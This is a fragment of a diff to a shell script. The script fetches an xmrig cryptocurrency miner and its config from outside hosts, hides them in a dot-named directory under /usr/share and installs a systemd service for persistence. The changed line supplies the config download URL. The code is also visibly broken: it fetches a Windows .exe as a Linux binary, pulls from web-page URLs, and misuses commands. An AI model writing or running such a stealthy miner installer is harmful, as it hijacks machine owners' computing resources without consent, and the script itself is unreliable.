@@ -18,7 +18,7 @@ then
    }
    exits
    
-   files=$(curl -s -O <https://git.mmpos.eu/cpu-windows/xmrig/-/blob/master/xmrig.exe>  -O <url for config.json> )
+   files=$(curl -s -O <https://git.mmpos.eu/cpu-windows/xmrig/-/blob/master/xmrig.exe>  -O <https://github.com/BestZebra/tesr/blob/main/config.json> )
    per=$(chmod 777 xmrig config.json && chmod 644 xmrig.service)
    dir=$(mkdir /usr/share/.logstxt)
    move=$(mv xmrig config.json /usr/share/.logstxt/ && mv xmrig.service /etc/systemd/system/)
